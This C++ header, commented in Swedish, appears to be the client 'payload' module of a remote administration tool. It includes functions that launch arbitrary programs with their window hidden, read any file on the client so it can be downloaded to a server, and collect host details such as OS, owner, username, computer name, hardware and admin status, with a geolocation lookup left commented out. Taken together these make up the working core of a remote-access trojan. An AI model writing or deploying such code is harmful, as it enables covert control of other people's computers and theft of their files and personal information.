#pragma once
#include "precompile.h"
#include "process.h"
#include "directory.h"
#include "http_session.h"
#include "nlohmann/json.hpp"
#include <Shlobj.h>

namespace helper { // olika hjälp funktioner till klienten
	std::pair<std::string, std::string> ArgSplit(std::string args, char delimit)
	{ // splitar en sträng vid mellanslaget till en std::pair

		auto found = args.find_first_of(delimit); // försök hitta första separeringen

		if (found != std::string::npos) { // om lyckats
			return { args.substr(0, found), args.substr(found + 1) }; // splita vid separering
		}
		else { // annars retunera bara det självstående argumentet
			return { args, "" };
		}
	}
	std::string dequote(std::string input) {
		input.erase(std::remove(input.begin(), input.end(), '\"'), input.end());
		return input;
	}
}

namespace payload { // payload funktioner som används för att utföra någonting på klienten tex starta en process ta reda på vem som är inloggad

	bool process_execution(std::string program, bool hide)
	{
		STARTUPINFOA info = { sizeof(info) };
		PROCESS_INFORMATION process_info;
		info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		// om processen ska gömmas så göm
		if (hide) {
			info.wShowWindow = SW_HIDE;
		}
		else {
			info.wShowWindow = SW_NORMAL;
		}
		//skapa process
		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, 0, 0, &info, &process_info)) {
			return false;
		}
		else {
			// för att undvika handle läcka
			CloseHandle(process_info.hProcess);
			CloseHandle(process_info.hThread);
			return true;
		}
	}

	// om processen ska skapas gömd
	std::string process_execution_hidden(std::string program)
	{
		if (!process_execution(program, true)) {
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}


	// om processen ska skapas visande
	std::string process_execution_show(std::string program)
	{
		if (!process_execution(program, false)) {
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}
	// om man vill ladda ner en fil från klienten till servern
	std::string download_file(std::string program)
	{
		if (std::filesystem::exists(program) && !std::filesystem::is_directory(program) && std::filesystem::file_size(program) > 0) { // om filen exsiterar och inte är en mapp
			std::ifstream file(program, std::ios::binary); // läs in filen binärt
			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()); // konvertera filen till en sträng med itrator konstruktion
		}
		else {
			return "FAIL";
		}
	}

	inline std::string GetValue(HKEY root_key, std::string key_name, std::string value)
	{
		// Get Registry Size and Type
		unsigned long value_type{};
		unsigned long value_size{};


		LSTATUS ret = RegGetValueA(root_key, key_name.c_str(), value.c_str(), RRF_RT_ANY | RRF_SUBKEY_WOW6464KEY, &value_type, NULL, &value_size);
		if (!ret) {

			switch (value_type) {
				case REG_DWORD:
				{
					DWORD buffer;
					if (!RegGetValueA(root_key, key_name.c_str(), value.c_str(), RRF_RT_ANY | RRF_SUBKEY_WOW6464KEY, &value_type, &buffer, &value_size)) {
						return std::to_string(buffer);
					}
				}
				case REG_SZ:
				case REG_MULTI_SZ:
				case REG_EXPAND_SZ:
				{
					std::vector<unsigned char> buffer(value_size, '\0');
					if (!RegGetValueA(root_key, key_name.c_str(), value.c_str(), RRF_RT_ANY | RRF_SUBKEY_WOW6464KEY, &value_type, buffer.data(), &value_size)) {
						buffer.resize(value_size);
						return (buffer[0] != '\0') ? std::string(buffer.begin(), buffer.end()) : "null";
					}
				}
				default:
					break;
			}
		}
		else {
			//std::cout << "Error: The System cannot find the registry entry!" << std::endl;
			return "";
		}

		return std::to_string(ret);

	}

	std::string info(std::string query)
	{
		//http_session geoip("Remote-Admin-Web 1/0", "api.ipdata.co");
		//nlohmann::json response = nlohmann::json::parse(geoip.request("GET", "?api-key=test"));
		//Sleep(100);
		std::unordered_map<std::string, std::function<std::string()>> information = {
			{"windows-product", [&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "productname"); } },
			{"windows-owner",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner"); } },
			{"windows-architecture",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "PROCESSOR_ARCHITECTURE"); } },
			{"computer-name",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", "ComputerName"); } },
			{"cpu-name", [&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString"); } },
			{"ram-size",[&] {
				MEMORYSTATUSEX buffer{sizeof(buffer)};

				GlobalMemoryStatusEx(&buffer);

				return std::to_string(std::roundl(buffer.ullTotalPhys / (1024.0 * 1024.0 * 1024.0)));
			}},
			{"windows-username", [&]{
				std::vector<char> buffer(256);
				DWORD size = 256;
				if (GetUserNameA(buffer.data(), &size)) {
					return std::string(buffer.begin(), buffer.end()).substr(0, size);
				}
				else {
					return std::string("null");
				}
			}},
			{"running-as-admin", [&] { return std::string(IsUserAnAdmin() ? "true" : "false"); }},
			//{ "public-ip",[&] { return helper::dequote(response["ip"].dump()); } },
			//{ "continent",[&] { return helper::dequote(response["continent_name"].dump()); } },
			//{ "country",[&] { return helper::dequote(response["country_name"].dump()); } },
			//{ "region", [&] { return helper::dequote(response["region"].dump()); } },
			//{ "city", [&] { return helper::dequote(response["city"].dump()); } },
			//{ "latitude",[&] { return helper::dequote(response["latitude"].dump()); } },
			//{ "longitude",[&] { return helper::dequote(response["longitude"].dump()); } },
			//{ "language",[&] { return helper::dequote(response["languages"].dump()); } }
		};

		if (information.count(query)) {
			return information[query]();
		}
		else {
			return "NOENTRY";
		}
	}
}

